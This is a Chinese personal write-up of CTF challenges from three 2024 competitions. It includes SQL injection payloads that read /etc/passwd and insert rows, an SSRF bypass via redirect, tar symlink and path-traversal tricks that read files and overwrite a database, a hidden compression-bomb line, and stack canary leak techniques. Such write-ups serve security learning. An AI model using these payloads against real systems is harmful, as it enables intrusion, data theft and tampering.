# RitsecCTF 2024 + DamCTF 2024 + GeekCTF 2024 个人Writeup
Lysithea

两周连续打了三场CTF，稍微有点脱产了，会休息一段时间。
RITSEC感觉比较不太好玩，DamCTF题量不多但感觉出的点比较奇怪（说不上难）。GeekCTF则是NUS等新加坡高校联合办的**个人周赛**，难度偏高而且很有趣，猜的要素不多，是这三个比赛里我最享受的。
顺便我本来是不打算认真打的，所以没有用CTFtimes的队名登录，反正我对GeekCTF没用CTFtime登录是有点后悔的。

[TOC]

# RitsecCTF 2024
## crypto - Dastardly Evil Scientists
DES弱密钥题。DES有4个弱密钥，`'0000000000000000','FFFFFFFFFFFFFFFF','E1E1E1E1F0F0F0F0','1E1E1E1E0F0F0F0F'`，加密和解密操作是一样的。这个题给出了加密的flag，并且能给出任意密文加密，但没有解密过程。硬碰DES显然是不可取的，所以我们首先要看看是不是弱密钥。


## crypto - Failed File Transfer
给了三组RSA公钥和密文，题干说是加密相同的信息。公钥1和2的N是一样的，然后公钥1和公钥3居然有最大公约数，gcd一下就出来了。意义不明。
顺便虽然公钥3的e=3，但是N还是太大了不适合直接爆破明文。

## crypto - Flag Distribution Server
相对有趣的一道题。

没有源码，只有nc服务器。我们可以指定一个【格式】和【IV】，然后打印出flag的密文。首先提供不匹配长度的IV，可以让服务器报错，泄露部分源码：
```python
Traceback (most recent call last):
  File "/app/run", line 89, in <module>
  File "/app/run", line 76, in main
    cipher = AES.new(key=key, mode=AES.MODE_CBC, iv=iv)
             ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File "/usr/local/lib/python3.12/site-packages/Crypto/Cipher/AES.py", line 228, in new
    return _create_cipher(sys.modules[__name__], key, mode, *args, **kwargs)
           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File "/usr/local/lib/python3.12/site-packages/Crypto/Cipher/__init__.py", line 79, in _create_cipher
    return modes[mode](factory, **kwargs)
           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File "/usr/local/lib/python3.12/site-packages/Crypto/Cipher/_mode_cbc.py", line 287, in _create_cbc_cipher
    raise ValueError("Incorrect IV length (it must be %d bytes long)" %
ValueError: Incorrect IV length (it must be 16 bytes long)
```
所以这应该是AES128-CBC加密。至于格式，根据nc给的示例和一些fuzz，可以得知类似于`fmt.format(flag)`这样的形式，可以传`{0}`, `{}`, `{0:s}`进去，大括号需要双写，但不知为什么传不了`{0[0]}`（如果能传这个题会弱化很多）。同时根据flag密文的返回，我们判断flag本身长度不会超过32个字节，所以我们只需要处理flag位于第一个block和第二个block两种情况。

由于IV可控，前16个字节比较容易。我们首先得到`'\0' * 0x10`在ECB意义下的密文，然后因为CBC的第一块密文等于`f(IV ^ plain1)`，所以我们只需要在明文格式前面留0xf个`\0`，在IV中遍历最后一个字符，直到和第一轮结果相同，我们就爆出了第一个字符。因为已知第一个字符，我们也就可以用同样方法爆出第二个字符，直到前0x10个字符。

后半部分稍微难一点。因为后16个字符的IV不可控（即第一块密文）。但其实我们只要知道第一块密文和第二块密文（随机加密一次就可做到），以及第二块明文的前n-1个字符，我们就可以把这个过程提到第一块来，这样我们又可以遍历IV的最后一个字符了。

[exp](ritsec_flagdist/req.py)

## rev - Go Go Gadget
第一次打Golang逆向（checksec可知）。不得不说这种时候还是得靠工具啊，找了一个Ghidra的`GolangAnalyzerExtension`插件，oneshot一下分析，至少可以快速看出我们要找的函数（evil.go中的main.main，其他都是库函数）。结合逆向的函数名通读逻辑，就是一个循环strxor，密钥是secret。

## pwn - The Gumponent
没任何营养的栈溢出

## web - [Warm Up] Beep Boop
这个题有个特点，网页上任何东西都不是CTF网站的，而是iframe链到外面。因为这个题是warmup，所以不可能有太复杂的东西，就看了一眼robots.txt，好了，就在这里，有个Base64串

## web - Toon Town Fan Club
比较简单的SQL注入。但我本身就不太擅长SQLi所以可以说难度匹配正常。

首先很容易在搜索页面试出来`1' or 1=1 #1`是有效的（我发现`--`注释符号好像不好用，不知道和sql版本有没有关系）。然后很容易union试出来取的变量是三个。然后开始拿数据库名，表名，列名
```sql
' databases
' and 1=2 union select schema_name,2,3 from information_schema.schemata #
' tables
' and 1=2 union select table_schema, table_name,3 from information_schema.tables where table_schema !='information_schema' #
' columns
' and 1=2 union SELECT GROUP_CONCAT(column_name),2,3 FROM information_schema.columns WHERE table_name = 'post' limit 1 # 
' version (load_file not work)
' and 1=2 union SELECT version(), load_file('/etc/passwd'), name from post #
```
三个列名分别是name, slug和filename。name应该是ID，slug是URL endpoint（比如访问`/blog/:slug`）就可以访问对应内容，而内容保存路径就是filename。如果能改filename我们可能可以实现任意文件读取。

然后需要提一下这个题是共享instance的，然后我做题的时候就发现有其他人一直往里面加奇奇怪怪的条目，但好像一会就会删掉。所以我认为这个题很可能能insert。但是select子句里是不能插入insert的。然而我们可以分号断成两句，就可以insert了。
```sql
' my_name is random generated uuid to slow others from accessing
' and 1=2; insert into post (name, slug, filename) values ('kusanagi_nene', '{my_name}', 'flag.txt')#
' dont forget to clear up evidence (but it seems deleting wont work somehow)
' and 1=2; delete from post where name='kusanagi_nene'#
```

嗯，就这样。

## web - Leaked Login
这题也比较奇怪。题目给了登录账号和密码，但是我们还需要一个两步验证OTP code。

一般两步验证是会向TOTP服务器发一个请求，然后TOTP根据结果会返回一个请求，包括验证是否通过，原本重定向的资源等等。但是这个题验证是否通过就看`flag.php`POST参数里是否有一个`goodness`参数，如果不通过这个参数是0。如果我手动改为1，那就通过了，就拿到flag了。

真实的TOTP不会这么简单的，一定是包含了加密和复杂逆向过程。但确实是有伪造的可能性。

# DamCTF 2024
## web-flower
源码给了很长，是一个flask服务，通外网。

敏感服务包括两个，一个是`/special_flower`，会判断`request.remote_addr`是否为四类本地IP，如果是则返回`flag.png`。因为正确配置了ProxyFix，所以不存在XFF绕过的可能性。（一般来说XFF是不能信任的，但如果服务器在NGINX等反代服务器后面，则可以信任最后一级，这似乎也是`werkzeug.ProxyFix`的默认参数）

另一个是`/filter_flower`，这个是一个通外网的搜索服务，首先会对URL做判断，用`urllib.parse`得到hostname，再用`dnspython`查询IP，如果为四类本地IP则直接abort，看起来过滤了SSRF。之后，会用requests进行请求，会调用一个混淆的密文，实际功能是判断URL path的后缀或者请求头是否为png图片，如果是则返回图片内容。

```python
_ = (proprietary_secret_ai_algorithm := 'Cih2Oj1yYW5kb20uY2hvaWNlcyhbMTQyNSwyMzQsMTIsMHg3QiwtOTEyLDU2LDg3LDI5NCwweDIwLDM5NCwzOCwweDRELDgwMCwxMjMsMzU2LDB4N0QsMTI4NywxNzEyLDMyLDBdLGs9NCksdls6Oi0xXVtpbnQuZnJvbV9ieXRlcyhieXRlcyhmbG93ZXJbMTAwOjEwNF0pKSAlIDRdLy84ICsgdlszXSUyMCA8IDI2MCBhbmQgKHBhdGgubG93ZXIoKS5lbmRzd2l0aCgoJy5wbmcnLCcuanBnJywnLmpwZWcnLCcuYm1wJykpIG9yIGZsb3dlci5zdGFydHN3aXRoKGJ5dGVzKFsweDg5LCAweDUwLCAweDRFLCAweDQ3LCAweDBELCAweDBBLCAweDFBLCAweDBBXSkpKSlbMV0gCg==',
proprietary_secret_ai_algorithm:=base64.b64decode(proprietary_secret_ai_algorithm))
is_flower = compile(proprietary_secret_ai_algorithm, "<0x1172947815>", "eval")
# equals to 
v:=random.choices([1425,234,12,0x7B,-912,56,87,294,0x20,394,38,0x4D,800,123,356,0x7D,1287,1712,32,0], k=4),
    v[::-1][int.from_bytes(bytes(flower[100:104])) % 4]//8 + v[3]%20 < 260 
    and (path.lower().endswith(('.png','.jpg','.jpeg','.bmp')) or flower.startswith(b'\x89PNG\r\n\x1a\n'))
```

我一开始试了很久能不能通过病态的URL，使得dnspython解析不出本地IP，同时requests能访问本地图片，但试了很久做不到，主要是`dnspython`对IP地址和不存在的域名会报错，而不是返回一个默认值。

最后忽然想到，我直接用302跳转不就解决了？域名解析过程必然不会处理302，而requests访问内容时，我用302跳转直接跳到`localhost/special_flower`，因为requests默认会跟踪302，就能绕过SSRF了。（顺便requests不解析javascript，`location.href`是无效的）

## web - tararchive
蛮好玩的一道题。最后一步非预期地绕过了一个猜，感觉说不定可以RCE。不过没有那么去做

这个题首先需要登录。推测登录只是分离用户的手段（又是共享instance），本身和题目无关。登录后是一个文件管理界面，可以上传文件，看已上传文件列表，下载文件。devtools抓包会发现上传的是某种二进制格式，拿下来看格式会发现是`.tar.gz`，结合JS逆向，看来上传过程是在网页端JS把文件打包到gzip里然后上传的，我们当然可以绕过这个过程直接用API上传gzip。

既然是gzip打包解压过程，那首先要看的就是能不能打软链接进去。在`tar`中加`P`参数可以把软链接直接打进去，我们可以用这个方法拿到`/etc/passwd`，也就是说任意文件读取达成。

但其实接下来才是重头戏，因为我们不知道flag在哪，需要在服务器上取证。首先拿下来`/proc/self/cmdline`和`/proc/self/environ`，可以知道服务器是Python Sanic Server，并且是以ROOT身份运行的。不过值得注意的是，我们自己的进程是子进程，所以还要看一眼`status`，尝试拿一下

```sh
# child process
/usr/local/bin/python -c from multiprocessing.spawn import spawn_main; spawn_main(tracker_fd=6, pipe_handle=20)  --multiprocessing-fork
# parent process
/usr/local/bin/python /usr/local/bin/sanic server -H 0.0.0.0
```
然后我们就发现问题了，源码呢？sanic显然是个包，我们还是不知道源码在哪。结合`sanic`文档，我们终于意识到源码应该和`sanic`里传的参数名一样是`server.py`，考虑到我们不知道绝对路径，那就`/proc/1/cwd/server.py`，确实拿到了源码。（1是父进程PID）。分析源码我们顺便把引用的几个本地模块`util.py`, `auth.py`一起拿下来。

然后开始分析源码。坏消息是，我们还是不知道flag在哪。好消息是，我们发现服务器数据库在哪了，显然题目用了`aiosqlite`，数据库就在`users.db`。同时，我们知道了用户注册时会初始化一个个人文件夹`files/<random-hash>/`，所有文件都会在这里。

下一步就是把数据库拿下来，用DB Browser看一眼，发现这个数据库只有三列：登录名，密码hash，个人文件夹目录。然后gzip解压还有个特性，就是当打包进去的路径包含`../../`时，解压时也会尊重这个路径，导致解压出来的文件穿越到父级目录去。为此，我们可以伪造一个数据库，放在本地的`../../users.db`位置，然后打进gzip上传，之后服务器解压时就会覆盖原本的`users.db`。说实话我也搞不清楚这个路径穿越解压是不是预期的，因为如果能猜到flag位置可以不需要这个，而且这个真的可以用来干扰其他选手比赛。本着公平竞技的原则，我只用insert加了一条，没有删库。好在源码里直接提供了密码hash的SALT，我们可以成功登录，并且把自己的文件目录放在任意位置，相当于可以对任意目录`ls`。最终我们会发现项目源码位于`/chall`，而`flag`就真的只在`/chall/flag`。所以如果能猜到flag位置就不用爆数据库了，不过说到底，能取证为什么要猜呢？

接下来能不能用这个RCE呢？至少我觉得可以把`server.py`源码换掉，或者把一些库换掉。考虑到这个可能太过分了我就没弄。

## misc - gitlabrunner (incomplete)
有点意思的题，但是最后没去做。这个题给了一个ssh，进去后是一个ubuntu docker镜像。我们会发现自己是docker组的，并且有外网，那docker组就等于root，我们可以挂载任意目录进docker达成任意文件越权读取。

进去后，稍微进行一些取证(看journalctl)，会发现后台运行着一个gitlab runner。可以拿到配置文件和secret token，似乎每隔十分钟这个runner就会进行一个build任务。如果我们能拦截这个build任务或许可以得到进一步信息，gitlab官方也提到如果泄露token可能可以导致任务克隆攻击。不过这要求我本地也跑一个runner，而且我多少不太喜欢别人代码不知情地运行在自己电脑的感觉，就没去搭环境。

## rev - ssh (incomplete)
花了不少精力但是没做出来，我get到IDEA了。这个题想让我们公钥登录一个SSH Server，给了一个`authlookup`二进制程序。题干里提示我们思考github这种，都是登录git用户，但是不同用户可以拿到不同权限的机制是怎么实现的。

逆向`authlookup`，它实现了类似的机制。它会传入一个公钥，然后判断公钥类型，提取公钥参数（比如对RSA公钥，就是N和e），然后放到SQL数据库里查询是否有这样的一条N,e记录，如果有就成功登录。但可惜这个`authlookup`是可以SQL注入的。

然而这个题难点在于我们不只要bypass公钥认证，还要利用OpenSSH来建立稳定连接。SSH提供的参数是私钥，私钥是包含公钥内容的。因此合理的设想是构造一个原始的私钥-公钥对，但把公钥部分都篡改成SQL注入内容，让服务器直接返回原本的公钥。思路非常合理，但是我无论如何都调试不通过，而且很难判断问题出在哪里。已知的一些问题包括，公钥N得超过1024位否则会因为不安全报错，除此以外可能还有别的各种验证（比如p和q的验证等等）。为此我还研究了下SSH私钥格式，了解了OpenSSH和OpenSSL用的RSA公钥其实格式还不一样，但实际上用pycrypto可以直接生成私钥，更方便一点。

# GeekCTF 2024
## misc - Boy's Bullet
> It was the spring of 2024 when a boy born in millennium picked up a real gun on the road. Because he was young, ignorant and fearless, he pulled the trigger. No one died and no one was injured. He thought he had fired a blank shot. Fourteen years later, he heard a faint sound of wind behind him while walking on the road. He stopped and turned around. The bullet hit him between the eyebrows.
>
> curl http://chall.geekctf.geekcon.top:10038

一开始还没意识到，2024+14=2038，所以我以为这个是想说32位Unix系统溢出问题，但其实还不是。

这个题给环境的方式很特别，给的是curl，当然连上之后它会陆续让我们用`-T`参数传文件，传的文件必须是`jpeg`文件（jpg扩展名还不行），然后会告诉我们文件的时间戳是多少年而不是2038年。

于是我首先想到的是改文件修改时间和创建时间（创建时间无法在WSL下改，我在Windows下用win32api改的），但没用，文件还是记录了我的真实时间。

其实这时我就该想到不对了，因为unix时间戳按说是不会出现在网络文件传输中的，所以这要么是在请求头里，要么是在文件内部（特别因为本题指定jpeg格式，在文件内部可能性很高）

如果看请求头，curl可以直接带verbose参数，会看到`-T`上传文件是用`PUT`，但好像也没什么特别的东西。然后我在上传文件时，把一个png图片扩展名改成`jpeg`上传了，结果服务器返回了报错信息。信息本身是flask debug模式，内嵌了很多HTML，不过我们还是能找到泄露的源码。

```python
@app.route("/<filename>", methods=["PUT"])
def upload(filename):
    if not filename.endswith("jpeg"):
        return "Photo must be in JPEG format\n"
    image = Image(request.data)
    try:
        # fetch timestamp from exif data
        exif_time = datetime.fromisoformat(image["datetime"].replace(":", "-", 2))
        exif_timestamp = c_int(int(exif_time.timestamp()))
        # fetch current timestamp
```

稍微调研一下，我们定位到时间是来自`exif`这个包，并且访问的是`datetime`这个属性。我们直接读出原始JPEG数据后，用`exif`修改这个属性再上传，就可以拿到flag。

> `flag{47_7h15_m0m3n7_3duc4710n_h45_c0mp1373d_4_72u1y_c1053d_100p}`

## misc - f and r
这个题给了一个Windows KB更新安装包（`windows10.0-kb114514-x64.msu`），第一次玩安装包，了解了不少知识。

首先根据[微软官方教程](https://support.microsoft.com/en-us/topic/description-of-the-windows-update-standalone-installer-in-windows-799ba3df-ec7e-b05e-ee13-1cdae8f23b19)，用`expand -f:*`命令把`msu`解包，其中`.cab`文件还可以继续解包。直到最后在`Cab_for_KB114514_PSFX.cab`中解包出了`amd64_curl_0o0o0o0o0o0o0o0_10.0.19041.9999_none_0o0o0o0o0o0o0o0`这个文件夹，里面包含`f/curl.exe`和`r/curl.exe`，看来这是我们要的东西。不过这两个exe都是二进制乱码。

接下来调研Windows更新机制，我们很快就知道这些是[PSFX差分更新](https://learn.microsoft.com/en-us/windows/deployment/update/psfxwhitepaper)，r文件可以还原到上一个版本，f文件则是更新到下个版本，只记录发生变化的部分。同时我还找到了[wumb0的writeup](https://wumb0.in/extracting-and-diffing-ms-patches-in-2020.html)，非常详细讲解了差分更新的原理，还附带了转换代码（说实话我自己去调研API还真不一定能写出这个来）

有现成工具就简单了。首先我们要拿一个原始的`C:\Windows\System32\curl.exe`文件。注意到解包过程中一些说明文件提到这个patch是`Windows 10 10.0.19041.1613`的，我也找了一台运行了很久的Win10机器，拿到了`curl.exe`。但同时，因为这个是22H2更新过的，我们最好还原到以前的版本，于是我在`C:\Windows\WinSxS`目录下搜索`curl`，找到
```
C:\Windows\WinSxS\amd64_curl_31bf3856ad364e35_10.0.19041.3693_none_f3098ce6d279979c\curl.exe
C:\Windows\WinSxS\amd64_curl_31bf3856ad364e35_10.0.19041.3693_none_f3098ce6d279979c\f\curl.exe
C:\Windows\WinSxS\amd64_curl_31bf3856ad364e35_10.0.19041.3693_none_f3098ce6d279979c\r\curl.exe
```
这三个文件，既然这是唯一的更新那我们就用wumb0的代码把这里的r补丁打上，然后再打上题目给的f补丁。把打好补丁的程序放进ghidra逆向，在字符串区域我们首先就发现原本是curl版本的部分变成了flag。静态分析可能也行，不过我直接`.\curl.exe --version`出flag了。

## misc - real or not 1
这个题首先会过一个PoW，爆破hash。然后会一次性给出20张图片的base64，让我们判断这些图片的文件名末尾是`Y`还是`N`，需要一次性给出所有答案。因为文件名信息完全丢失，这个题相当无厘头。好在第一问是会告诉你是在第n轮出错的，那么前n-1轮都是对的，第n轮是错的。我们只要弄个字典+pickle记录每次的结果（可以把图片的hash作为key），多试几次，总能爆出来的。另外我发现环境关了再开YN结果可能会不一致，最好一次性做完。

`flag{DeepFake_1s_Ea5y_aNd_1ntere5t1ng!}`

其他思路，首先是图片本身可能有问题（我拿到flag1后更觉得这个可能，但是pngcheck和file都看不出问题）。其次，PoW生成使用的`random.choices(string.ascii_letters + string.digits, k=16)`，说不定可以根据这个爆出种子（实际上每个choice都是一次`random()`，而一次`random()`对应两次`randint32`，不过因为结果是浮点数，显然得不到内部状态。而且就算能预测随机数，我们也不知道后面filename那里的choice怎么对应）

这个题后面给了个补丁，第二问修过之后，PoW时间延长，也不能根据轮次泄露正确答案了，不会做。但做出来人很多，看来有我不知道的东西。

## misc - whereismyflag
仅次于签到的简单题，但其实这题基本是[GeekGame3未来磁盘](https://github.com/PKU-GeekGame/geekgame-3rd/tree/master/official_writeup/prob21-gzip)的弱化版。

题目给了一个github仓库。clone下来后，发现没有历史记录，但`schedule-ics-exporter.py`的最后一行好像特别长啊：
```python
print('[+] Done! ICS file successfully generated.')                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                     ;import gzip; import base64; gzip.decompress(base64.b64decode('H4sIAAAAAAACA5Pv5mAAASbmt3cNuf9EzT3+sN5nQrdr2jIOrcbXJmHROjnJAouEuzN5jcq4Fbf6bN1wVlfNYInA9KvHri/k2HjhUVbxzHOHlB5vNdhWdDOpzPyo0Yy7S+6LFzyoXBVc/0r/+ffe+TVfEr8u/dF93/3if9td8//+Ff//8WK4HQMUNL7+V9J/3fBA+2Ojea/lmaCiC7PLMzf1Mt3zjTvJCBU6+Pp00v6/Ah92xQpbQoUUKm7azN2meyBZkk/cFi52vlpmbXQD0LhshLq3er7XdB2+533y4oOKccTFi/1+63HgdZnvE6hQw4PUzyW3tjH0p1rEfIGL2b4v3JLH2He6Yt1TuNjW3SaR2xnu7j6pjbCiNvLNdmXG9bdNJzJDxZqmn72ceZvJZtrDgotwse97jl/cxWqh93jnNLjY9XeXUu4ylbxXW49wytfUjff7WPbkXXdBuNjMf3ku94eItsOu/DCxe5/l3F+LPdjR8zwKoW639+RS7gt7Z++ZhLBi+tE6a6HRwBsNvNHAGw280cAbDbzRwBsNPETgff/8c/3l6bfX1355+POl/P+f7P/n1n17/L7239/8ufs8Ztf/fWr+mP/P/rrvL+vrbP59m1/39Wf/vh/T///y/vb102R/u9/b4///3m4v9+/D9vof7+bv/zX7v2bdr375Xe//6DOe7GOObudnAAAdRZxfbAoAAA=='))
# remove spaces:
import gzip; import base64; gzip.decompress(base64.b64decode('H4sIAAAAAAACA5Pv5mAAASbmt3cNuf9EzT3+sN5nQrdr2jIOrcbXJmHROjnJAouEuzN5jcq4Fbf6bN1wVlfNYInA9KvHri/k2HjhUVbxzHOHlB5vNdhWdDOpzPyo0Yy7S+6LFzyoXBVc/0r/+ffe+TVfEr8u/dF93/3if9td8//+Ff//8WK4HQMUNL7+V9J/3fBA+2Ojea/lmaCiC7PLMzf1Mt3zjTvJCBU6+Pp00v6/Ah92xQpbQoUUKm7azN2meyBZkk/cFi52vlpmbXQD0LhshLq3er7XdB2+533y4oOKccTFi/1+63HgdZnvE6hQw4PUzyW3tjH0p1rEfIGL2b4v3JLH2He6Yt1TuNjW3SaR2xnu7j6pjbCiNvLNdmXG9bdNJzJDxZqmn72ceZvJZtrDgotwse97jl/cxWqh93jnNLjY9XeXUu4ylbxXW49wytfUjff7WPbkXXdBuNjMf3ku94eItsOu/DCxe5/l3F+LPdjR8zwKoW639+RS7gt7Z++ZhLBi+tE6a6HRwBsNvNHAGw280cAbDbzRwBsNPETgff/8c/3l6bfX1355+POl/P+f7P/n1n17/L7239/8ufs8Ztf/fWr+mP/P/rrvL+vrbP59m1/39Wf/vh/T///y/vb102R/u9/b4///3m4v9+/D9vof7+bv/zX7v2bdr375Xe//6DOe7GOObudnAAAdRZxfbAoAAA=='))
```

看起来用gzip解压了一个东西。我们保存为`.tar.gz`手动解压，发现里面还有个`tar.gz`。但再解压之前得小心了，因为第二轮的`tar.gz`有2M的大小，而它解压后的内容更是有1GB。看来这是个压缩炸弹。

如此离谱的解压率，那肯定是因为原始文件中全是重复串，这样的文件在zlib压缩下会产生循环节。经过一些测试（主要还是010editor搜索功能），会发现循环节是`0x8031`。我们可以打印每个循环节的hash
```python
cyclic = 0xc054 - 0x4023

for i in range(0x4030, len(secret_gz), cyclic):
    seg = secret_gz[i:i+cyclic]
    seg_hash = md5(seg).hexdigest()
    print(hex(i), seg_hash)

# output
0x4030 b5f977612e6028cc915d4696d27f1e4c
0xc061 b5f977612e6028cc915d4696d27f1e4c
0x14092 b5f977612e6028cc915d4696d27f1e4c
0x1c0c3 b5f977612e6028cc915d4696d27f1e4c
0x240f4 b5f977612e6028cc915d4696d27f1e4c
0x2c125 b5f977612e6028cc915d4696d27f1e4c
0x34156 b5f977612e6028cc915d4696d27f1e4c
0x3c187 b5f977612e6028cc915d4696d27f1e4c
0x441b8 b5f977612e6028cc915d4696d27f1e4c
0x4c1e9 b5f977612e6028cc915d4696d27f1e4c
0x5421a b5f977612e6028cc915d4696d27f1e4c
0x5c24b b5f977612e6028cc915d4696d27f1e4c
0x6427c b5f977612e6028cc915d4696d27f1e4c
0x6c2ad b5f977612e6028cc915d4696d27f1e4c
0x742de b5f977612e6028cc915d4696d27f1e4c
0x7c30f b5f977612e6028cc915d4696d27f1e4c
0x84340 b5f977612e6028cc915d4696d27f1e4c
0x8c371 b5f977612e6028cc915d4696d27f1e4c
0x943a2 b5f977612e6028cc915d4696d27f1e4c
0x9c3d3 b5f977612e6028cc915d4696d27f1e4c
0xa4404 b5f977612e6028cc915d4696d27f1e4c
0xac435 b5f977612e6028cc915d4696d27f1e4c
0xb4466 b5f977612e6028cc915d4696d27f1e4c
0xbc497 b5f977612e6028cc915d4696d27f1e4c
0xc44c8 b5f977612e6028cc915d4696d27f1e4c
0xcc4f9 b5f977612e6028cc915d4696d27f1e4c
0xd452a b5f977612e6028cc915d4696d27f1e4c
0xdc55b b5f977612e6028cc915d4696d27f1e4c
0xe458c b5f977612e6028cc915d4696d27f1e4c
0xec5bd b5f977612e6028cc915d4696d27f1e4c
0xf45ee d654be24ae26570873990c441b74b80f
0xfc61f 57307bdd454f14e64a7d0c3e0d346070
0x104650 57307bdd454f14e64a7d0c3e0d346070
0x10c681 57307bdd454f14e64a7d0c3e0d346070
0x1146b2 57307bdd454f14e64a7d0c3e0d346070
0x11c6e3 57307bdd454f14e64a7d0c3e0d346070
0x124714 57307bdd454f14e64a7d0c3e0d346070
0x12c745 57307bdd454f14e64a7d0c3e0d346070
0x134776 57307bdd454f14e64a7d0c3e0d346070
0x13c7a7 57307bdd454f14e64a7d0c3e0d346070
0x1447d8 57307bdd454f14e64a7d0c3e0d346070
0x14c809 57307bdd454f14e64a7d0c3e0d346070
0x15483a 57307bdd454f14e64a7d0c3e0d346070
0x15c86b 57307bdd454f14e64a7d0c3e0d346070
0x16489c 57307bdd454f14e64a7d0c3e0d346070
0x16c8cd 57307bdd454f14e64a7d0c3e0d346070
0x1748fe 57307bdd454f14e64a7d0c3e0d346070
0x17c92f 57307bdd454f14e64a7d0c3e0d346070
0x184960 57307bdd454f14e64a7d0c3e0d346070
0x18c991 57307bdd454f14e64a7d0c3e0d346070
0x1949c2 57307bdd454f14e64a7d0c3e0d346070
0x19c9f3 57307bdd454f14e64a7d0c3e0d346070
0x1a4a24 57307bdd454f14e64a7d0c3e0d346070
0x1aca55 57307bdd454f14e64a7d0c3e0d346070
0x1b4a86 57307bdd454f14e64a7d0c3e0d346070
0x1bcab7 57307bdd454f14e64a7d0c3e0d346070
0x1c4ae8 57307bdd454f14e64a7d0c3e0d346070
0x1ccb19 57307bdd454f14e64a7d0c3e0d346070
0x1d4b4a 57307bdd454f14e64a7d0c3e0d346070
0x1dcb7b 57307bdd454f14e64a7d0c3e0d346070
0x1e4bac 57307bdd454f14e64a7d0c3e0d346070
0x1ecbdd d30ed2b6a8ede0657a6b374d99f49ce0
```
可以发现中间有跳变，前后都是一样的串。这些串只要保留一处就可以了，其他都可以删去。去除重复串后，再解压文件就没那么大了（也有60M）。注意因为gzip格式最后8个字节是CRC32校验码和长度，保存到文件解压会报错，但可以用zlib解压（其实也是看python gzip库的源码，hook掉CRC和长度的校验）解压出来是全NULL字节+flag的形式。

## pwn - memo系列（2/3）
memo系列，前两问是比较简单，第三问很难。

第一问要逆向一个密码。这个密码会modified base64编码后和全局字符串变量比较，但是注意程序初始化时在`DT_INIT_1`里还对字符串变量密码做了ascii + 1的操作。这个可以用gdb断点拿到b64编码，也可以写程序，怎么样都好。

第二问是在第一问基础上，进入后续的笔记管理系统。这个题保护全开，是一个基于栈的管理系统，可以增加、修改、展示、归零栈上的一条记录。其中`edit`函数会用`scanf`读取一个`%lld`作为读取长度，但后续`readline`函数长度是`uint`，所以有整数溢出漏洞，传负数可以绕过长度限制。另外，这个题readline只有当读入字符数刚好等于传入长度时，不会00截断。

```c
void FUN_001017f2_edit(char *param_1,uint param_2)

{
  long in_FS_OFFSET;
  long local_18;
  long local_10;
  
  local_10 = *(long *)(in_FS_OFFSET + 0x28);
  printf("How many characters do you want to change:");
                    /* negative number overflow */
  __isoc99_scanf("%lld",&local_18);
                    /* local_18 < (0-0x100) ==0x118?? */
  if (local_18 < (long)(ulong)param_2) {
    FUN_0010170e_readline(param_1,(int)local_18);
    puts("Done!");
  }
  if (local_10 != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return;
}


uint FUN_0010170e_readline(char *param_1,uint param_2)

{
  uint local_c;
  
  local_c = 0;
  while( true ) {
    if (param_2 <= local_c) {
      return local_c;
    }
    read(0,param_1 + (int)local_c,1);
    if (param_1[(int)local_c] == '\n') break;
    local_c = local_c + 1;
  }
  param_1[(int)local_c] = '\0';
  return local_c;
}

```
这个题有个很神奇的解法，就是如果这里长度传`0xf000000000000109 - 0x10000 ** 4`，可以既让`edit`里的`local_18`是个负数绕过检查，又可以让`readline`里的`param_2`是个正数以保证截断。这样就泄露出canary了。后面就简单ROP调用一下system就行了。

第三问`edit`这里就改成`%u`了，同时整个笔记不在栈上，而是匿名mmap到堆上（ld上方，libc下方）。同时增加了一个sign函数，可以做到：读取相对于`mmap`基地址一个`uint`字节的位置（只能向高地址溢出了）8字节，进行一次`0x50`字节的栈溢出（canary在0x18, 返回地址在0x28），再修改刚刚读取地方的0x10字节。然后程序会直接调用`_exit`退出。
```c

void FUN_00101a19_sign(int param_1)

{
  long in_FS_OFFSET;
  uint local_2c;
  char local_28 [24];
  long local_10;
  
  local_10 = *(long *)(in_FS_OFFSET + 0x28);
  printf("Where would you like to sign(after the content): ");
  __isoc99_scanf("%u",&local_2c);
  if (DAT_00104130_mmap[local_2c] != '\0') {
    printf("You will overwrite some content: ");
                    /* this can leak addr, libc and mmap should be adjacent? */
    write(1,DAT_00104130_mmap + local_2c,8);
  }
  printf("Enter your name: ");
                    /* stackoverflow here, can trigger __stack_chk_fail */
  FUN_001017e9_readline(local_28,0x50);
  strncpy(DAT_00104130_mmap + local_2c,local_28,0x10);
  if (local_10 != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return;
}
```
这个题我感觉应该是和`ld.so`有关，可能堆上有canary相关信息。可惜fsbase在映射地址的低地址处，所以应该无法从这里读取canary。无论是`__stack_chk_fail`还是`_exit`我们似乎都没法干涉。还有可能，因为这个题给了很完整的环境，不知道`xinetd`产生进程是`fork`还是`spawn`，不知道canary是否共享？

## pwn-flat
这个题分为两部分，前半部分是去混淆，题目很明显是`ollvm`那种单个控制变量的混淆方法，非常标准，在diagram里看的很清楚。

![](pwn-flat/blok_view.png)

我这里也是用了别人写的去混淆插件[ollvm_deobf_fla](https://github.com/PAGalaxyLab/ghidra_scripts/blob/master/ollvm_deobf_fla.py)

去混淆之后，就是经典的堆笔记管理系统，只不过没有回显。这个题也是增删改查都有，不过这些部分都没有漏洞（free后指针置空，大小和index两侧判断没有整数溢出，读取字符串至多读取n-1个并且最后一定会加上空字节），而是给了一个只能用一次的`bad`部分：
```c
if (!bVar1) {
                /* WARNING: Subroutine does not return */
    exit(0);
}
bVar1 = false;
iVar2 = FUN_004016b0_readint?();
if (((iVar2 < 0) || (0x1f < iVar2)) ||
    ((note_ARRAY_004060b0[iVar2].mem == (char *)0x0 || (note_ARRAY_004060b0[iVar2].length == 0)))
    ) break;
for (local_16c = 0; local_16c < (uint)note_ARRAY_004060b0[iVar2].length;
    local_16c = local_16c + 1) {
                /* convert to char, so >0x7f would overflow to negative */
